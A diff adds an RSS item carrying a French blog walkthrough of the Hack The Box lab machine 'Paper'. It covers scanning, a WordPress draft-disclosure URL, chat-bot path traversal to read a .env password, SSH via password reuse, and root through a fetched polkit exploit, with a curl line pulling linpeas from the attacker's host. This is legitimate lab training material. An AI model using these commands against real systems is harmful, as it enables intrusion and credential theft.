@@ -498,4 +498,424 @@ run
 <h2 id="outro">Outro</h2>
 <p>Une nouvelle box plutôt fun, qui m&rsquo;a permis de jouer avec le contenu de <code>/proc</code> afin de retrouver les processus actifs du serveur. Mais aussi une box, qui m&rsquo;a rappelé que les scans <code>nmap</code> rapides, c&rsquo;est bien joli, mais ça ne voit pas tout.</p>
 <p>A l&rsquo;avenir, il pourrait aussi être opportun de lancer un <code>nmap -p-</code> en arrière-plan, histoire de&hellip;</p>
+]]></description></item><item><title>HTB - Paper sans MetaSploit</title><link>https://www.masoopy.com/fr/htb-paper-sans-metasploit/</link><pubDate>Sat, 12 Mar 2022 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/fr/htb-paper-sans-metasploit/</guid><description><![CDATA[<div class="featured-image">
+                <img src="/images/2022/03/Paper_Logo.png" referrerpolicy="no-referrer">
+            </div><h2 id="intro">Intro</h2>
+<p>Aujourd&rsquo;hui, nous allons nous attaquer à Paper, une box plutôt simple et aussi très fun. Si vous débutez dans le domaine, je vous recommande très fortement d&rsquo;essayer de vous creuser la tête avant de lire ce guide. Cette box est vraiment fun, et très sympa pour les débutants !</p>
+<h2 id="cible">Cible</h2>
+<p><a href="https://app.hackthebox.com/machines/Paper" target="_blank" rel="noopener noreferrer">HTB - Paper</a></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Petite reconnaissance basique en fonction des logos et autres infos :</p>
+<ul>
+<li>Il s&rsquo;agit d&rsquo;un système Linux ;</li>
+<li>&hellip;</li>
+</ul>
+<p>Et c&rsquo;est tout !</p>
+<h2 id="énumération">Énumération</h2>
+<p>Lançons notre scan <code>nmap</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\$IP_CIBLE
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 15:39 CET
+Nmap scan report for $IP_CIBLE
+Host is up (0.037s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Not valid before: 2021-07-03T08:52:34
+|_Not valid after:  2022-07-08T10:32:34
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+</code></pre></td></tr></table>
+</div>
+</div><p>Nous pouvons voir les services classiques pour une box Linux : SSH et un serveur Apache qui tourne sur les ports 80/tcp et 443/tcp (pour le HTTPs).</p>
+<p>Sachant qu&rsquo;il s&rsquo;agit d&rsquo;un serveur web, j&rsquo;aime bien lancer <code>Gobuster</code> pour essayer de trouver des chemins cachés :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">gobuster dir -u http://$IP_CIBLE -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -t 20 -o scans/gobuster
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://$IP_CIBLE
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/03/02 15:42:41 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 199]
+/.htpasswd            (Status: 403) [Size: 199]
+/.htaccess            (Status: 403) [Size: 199]
+/cgi-bin/             (Status: 403) [Size: 199]
+/manual               (Status: 301) [Size: 236] [--&gt; http://$IP_CIBLE/manual/]
+                                                                                  
+===============================================================
+2022/03/02 15:42:52 Finished
+===============================================================
+</code></pre></td></tr></table>
+</div>
+</div><p>Ce scan ne nous révèle pas grand chose&hellip; Nous allons donc lancer <code>Nikto</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">nikto -h http://$IP_CIBLE
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          $IP_CIBLE
++ Target Hostname:    $IP_CIBLE
++ Target Port:        80
++ Start Time:         2022-03-02 15:46:14 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8724 requests: 0 error(s) and 11 item(s) reported on remote host
++ End Time:           2022-03-02 15:49:53 (GMT1) (219 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre></td></tr></table>
+</div>
+</div><p>A première vue, nous pourrions penser qu&rsquo;il n&rsquo;y a rien d&rsquo;intéressant ici non plus. Pour être honnête, je suis totalement passé à côté pendant un certain temps&hellip;</p>
+<p>Finalement, il y a la ligne suivante : <code>Uncommon header 'x-backend-server' found, with contents: office.paper</code>.</p>
+<p>En voyant, cela, j&rsquo;ai donc décidé de rajouter une entrée dans le fichier <code>/etc/hosts</code> faisant pointer l&rsquo;IP de la box vers le nom d&rsquo;hôte <code>office.paper</code>.</p>
+<p>Une fois cela fait, en se rendant sur l&rsquo;URL : <code>http://office.paper</code>, nous découvrons un nouveau site tournant sous <code>Wordpress</code> :</p>
+<p></p>
+<p>Qui dit Wordpress, dit WPScan, c&rsquo;est parti :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">wpscan --url http://office/paper
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">         __          _______   _____                                                                                                                                                                              
+         \ \        / /  __ \ / ____|                                                                                                                                                                             
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                                                                                            
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \                                                                                                                                                             
+            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                            
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                            
+                                                                                                                                                                                                                  
+         WordPress Security Scanner by the WPScan Team                                                                                                                                                            
+                         Version 3.8.17                                                                                                                                                                           
+       Sponsored by Automattic - https://automattic.com/                                                                                                                                                          
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                            
+_______________________________________________________________                                                                                                                                                   
+                                                                                                                                                                                                                  
+[i] It seems like you have not updated the database for some time.                                                                                                                                                
+[?] Do you want to update now? [Y]es [N]o, default: [N]Y                                                                                                                                                          
+[i] Updating the Database ...                                                                                                                                                                                     
+[i] Update completed.                                                                                                                                                                                             
+                                                                                                                                                                                                                  
+[+] URL: http://office.paper/ [$IP_CIBLE]                                                                                                                                                                     
+[+] Started: Thu Mar  3 14:20:45 2022                                                                                                                                                                             
+                                                                                                                                                                                                                  
+Interesting Finding(s):                                                                                                                                                                                           
+                                                                                                                                                                                                                  
+[+] Headers                                                                                                                                                                                                        | Interesting Entries:                                                                                                                                                                                          
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9                                      
+ |  - X-Powered-By: PHP/7.2.24                                                                           
+ |  - X-Backend-Server: office.paper                                                                     
+ | Found By: Headers (Passive Detection)                                                                 
+ | Confidence: 100%                                                                                      
+                                                                                                                                                                                                                 
+[+] WordPress readme found: http://office.paper/readme.html                                              
+ | Found By: Direct Access (Aggressive Detection)                                                        
+ | Confidence: 100%                                                                                                                                                                                               
+                                                                                                         
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).                               
+ | Found By: Rss Generator (Passive Detection)                                                                                                                                                                   
+ |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                                 
+ |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;                                                                                                        
+                                                    
+[+] WordPress theme in use: construction-techup                                                                                                                                                                  
+ | Location: http://office.paper/wp-content/themes/construction-techup/                                  
+ | Last Updated: 2021-07-17T00:00:00.000Z                                                                                                                                                                        
+ | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt                                                                                                                                  
+ | [!] The version is out of date, the latest version is 1.4                                                                                                                                                     
+ | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1                
+ | Style Name: Construction Techup                                                                                                                                                                               
+ | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...                                                                                          
+ | Author: wptexture                
+ | Author URI: https://testerwp.com/                                                                     
+ |                                                                                                                                                                                                               
+ | Found By: Css Style In Homepage (Passive Detection)          
+  |                                                                                                       
+ | Version: 1.1 (80% confidence)                                                                         
+ | Found By: Style (Passive Detection)                                                                   
+ |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; 
+                                                                                                                                                                                                                 
+[+] Enumerating All Plugins (via Passive Methods)                                                        
+                                                                                                         
+[i] No plugins Found.                                                                                                                                                                                             
+                                                                                                         
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      
+ Checking Config Backups - Time: 00:00:00 &lt;===================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
+                                                                                                                                                                                                                 
+[i] No Config Backups Found.                                                                                                                                                                                      
+                                                    
+[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                               
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register    
+                                                                                                                                                                                                                 
+[+] Finished: Thu Mar  3 14:20:50 2022                                                                                                                                                                           
+[+] Requests Done: 180                                                                                                                                                                                           
+[+] Cached Requests: 5                                                                                   
+[+] Data Sent: 43.575 KB                                                                                                                                                                                         
+[+] Data Received: 17.864 MB                                                                                                                                                                                      
+[+] Memory used: 229.191 MB         
+[+] Elapsed time: 00:00:04
+</code></pre></td></tr></table>
+</div>
+</div><p>Il s&rsquo;agit d&rsquo;un vieux <code>Wordpress</code>, version 5.2.3 ! Un tour rapide sur <a href="https://www.exploit-db.com/exploits/47690" target="_blank" rel="noopener noreferrer">exploit-db</a> nous apprend qu&rsquo;il est vulnérable. La faille en question permet d&rsquo;accéder aux brouillons et autre contenu non publié&hellip; Sur le Wordpress que nous venons de découvrir, il y a justement des commentaires laissant penser que l&rsquo;admin du site à noté des infos dans les brouillons&hellip;</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>L&rsquo;exploit recommande d&rsquo;utiliser l&rsquo;URL suivante :</p>
+<p><code> http://office.paper/?static=1&amp;order=asc</code></p>
+<p>Cela ne fonctionne pas&hellip;</p>
+<p>Essayons donc, simplement de changer l&rsquo;URL en remplaçant le dernier mot clef par son contraire :</p>
+<p><code>http://office.paper/?static=1&amp;order=desc</code></p>
+<p>Bingo, cela fonctionne :</p>
+<p></p>
+<p>Nous découvrons une nouvelle URL &ldquo;secrète&rdquo;, avec un nouveau nom de domaine : <code>chat.office.paper</code>. Nous le rajoutons donc dans notre fichier <code>/etc/hosts</code> afin de pouvoir y accéder.</p>
+<p>Une fois cela fait, nous naviguons vers cette URL et nous découvrons, un chat, <code>Rocket Chat</code>. Il est possible de créer un compte, faisons le !</p>
+<p>Une fois le compte créé, nous avons accès au chat et à l&rsquo;historique des messages. Après un peu de lecture, nous découvrons qu&rsquo;il existe un bot capable de lister et obtenir des documents et fichiers. Allons lui parler !</p>
+<p>Nous remarquons rapidement qu&rsquo;il est assez simple de naviguer dans les fichiers avec la commande <code>recyclops list</code>, et surtout, nous pouvons sortir du dossier actuel avec <code>recyclops list ../</code>. Ce qui liste le contenu de la <code>home</code> de l&rsquo;utilisateur. Au passage, nous voyons aussi son nom : <code>Dwight</code>. Malheureusement, impossible d&rsquo;obtenir le <code>user.txt</code>, ni des fichiers systèmes intéressants.</p>
+<p>Cependant, le dossier <code>/home/dwight</code> contient un script <code>bot_restart.sh</code> qui pointe lui-même vers un autre script dans lequel est appelé un fichier <code>.env</code>. Grâce à la commande : <code>recyclops file ../hubot/.env</code> nous pouvons lire le contenu de ce fichier qui contient un mot de passe !!</p>
+<p></p>
+<p>L&rsquo;utilisateur n&rsquo;est pas présent sur le système, il s&rsquo;agit probablement de l&rsquo;admin du chat. Essayons tout de même le MDP trouvé avec l&rsquo;utilisateur <code>dwight</code> via <code>SSH</code>.</p>
+<h3 id="obtenir-un-premier-shell">Obtenir un premier shell</h3>
+<p>Bingo ! Un bon gros cas de réutilisation de mot de passe ! <code>Dwight</code> et <code>Recyclops</code> partagent le même MDP. Nous sommes donc sur le machine, en <code>SSH</code> ! C&rsquo;est à dire un super shell, bien stable et facile à relancer en cas de besoin.</p>
+<p>Obtenir le <code>flag user</code> est donc un jeu d&rsquo;enfant, via la commande <code>cat</code> :</p>
+<p></p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Désormais, le <code>PrivEsc</code> ! Nous avons un accès utilisateur, mais nous allons chercher à augmenter nos droits afin de devenir <code>root</code> et ainsi avoir le contrôle total de la machine.</p>
+<p>Pour ce faire, j&rsquo;aime lancer un scan via <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">LinPeas</a> (WinPeas sous Windows).</p>
+<p>Sur toutes les machines <code>HTB</code>, l&rsquo;accès vers internet et coupé. Il faut donc télécharger la dernière version du script sur notre machine &ldquo;attaquante&rdquo; et ensuite l&rsquo;envoyer depuis notre machine vers notre cible. Puisque nous avons un accès <code>SSH</code>, nous pouvons simplement l&rsquo;envoyer via <code>SCP</code>, mais je préfère une méthode plus universelle via un module <code>Python</code>.</p>
+<p>Je vais donc vous montrer comment procéder :</p>
+<ol>
+<li>Sur notre machine qui &ldquo;attaque&rdquo;, il faut se placer dans le dossier contenant le script <code>linpeas.sh</code> puis lancer la commande suivante : <code>python3 -m http.server</code>.</li>
+<li>Sur la &ldquo;cible&rdquo;, il faut récupérer le script : <code>curl -O http://$IP_ATTAQUANT:8000/linpeas.sh</code>.</li>
+</ol>
+<p>Une fois le script téléchargé, nous l&rsquo;éxécutons. Rapidement, Linpeas détecte une vulnérabilité du côté de <code>sudo</code> :</p>
+<p></p>
+<p>Une recherche rapide sur <a href="https://duckduckgo.com/?q=CVE-2021-3560&#43;exploit&#43;github&amp;t=ffab&amp;ia=web" target="_blank" rel="noopener noreferrer">DDG</a>, nous amène vers un <a href="https://github.com/Almorabea/Polkit-exploit" target="_blank" rel="noopener noreferrer">dépôt Github prometteur</a>.</p>
+<p>Même procédure que pour le script <code>linpeas.sh</code>, nous allons récupérer le fichier <code>CVE-2021-3560.py</code> sur notre cible et l&rsquo;exécuter.</p>
+<p><strong>NB : avant d&rsquo;exécuter un script, quelque il soit, il est toujours très important de le lire et d&rsquo;essayer de le comprendre ! Vous ne voulez surtout pas exécuter un script qui compromettrait votre machine.</strong></p>
+<p>Après quelques secondes, le script nous donne un accès <code>root</code> :</p>
+<p></p>
+<p>Et nous récupérons enfin le <code>flag root</code> :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>Cette box était plutôt simple, une très bonne box pour reprendre après plusieurs mois d&rsquo;absence. Elle était aussi assez fun : le header &ldquo;caché&rdquo; était très bien trouvé et m&rsquo;a perdre un temps certain ! Ensuite, le bot du chat était très original et m&rsquo;a bien amusé ! Bref, une super box que je recommande fortement aux débutants.</p>
 ]]></description></item></channel></rss>
